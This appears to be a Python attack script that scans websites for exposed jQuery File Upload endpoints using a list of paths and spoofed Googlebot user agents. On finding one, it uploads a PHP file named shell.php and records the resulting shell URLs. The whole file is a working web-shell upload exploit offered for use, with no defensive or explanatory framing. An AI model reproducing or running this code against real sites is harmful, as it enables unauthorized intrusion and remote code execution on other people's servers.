import random

import requests
import sys
import re
import attrs
import colorama
import os


# disable warning
requests.packages.urllib3.disable_warnings()
@attrs.define
class JfuExploit:
    """
    class to exploit jfu
    """
    url: str = None

    user_agent = [
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Mobile Safari/537.36",

    ]
    def check(self):
        # remove ftp. from url
        self.url = self.url.replace('ftp.', '')

        jfu_path_file = os.path.join(os.path.dirname(__file__), 'jfu_path.txt')
        cert_file = os.path.join(os.path.dirname(__file__), 'certs.pem')
        with open(jfu_path_file) as f:
            for line in f:
                try:
                    # random user agent
                    r = requests.get(self.url + line.strip(), verify=False, timeout=10, headers={'User-Agent': random.choice(self.user_agent)})
                    if '{"files":[{"name":"' in r.text:
                        print(colorama.Fore.GREEN + "[+] Found jfu path: " + self.url + line.strip() + colorama.Fore.RESET)
                        with open('../result/vuln_jfu.txt', 'a') as f:
                            f.write(self.url + line.strip() + '\n')
                        files = {"files[]": ("shell.php", open("sample.php", "rb"), "application/octet-stream")}
                        r = requests.post(self.url + line.strip(), files=files, verify=cert_file, timeout=10, headers={'User-Agent': random.choice(self.user_agent)})
                        if r.status_code == 200:
                            print(colorama.Fore.GREEN + "[+] Upload shell.php success" + colorama.Fore.RESET)
                            match = re.search(r'"url":"(.*?)"', r.text)
                            if match:
                                uploaded_url = match.group(1).replace('\\', '')
                                print(colorama.Fore.GREEN + "[+] Shell uploaded at: " + uploaded_url + colorama.Fore.RESET)
                                with open('../result/shell_uploaded.txt', 'a') as f:
                                    f.write(uploaded_url + '\n')
                            else:
                                print(colorama.Fore.RED + "[-] Upload shell failed" + colorama.Fore.RESET)
                        else:
                            print(colorama.Fore.RED + "[-] Not Vuln JFU" + colorama.Fore.RESET)
                except Exception as e:
                    print(colorama.Fore.RED + "[-] Error: " + str(e) + colorama.Fore.RESET)
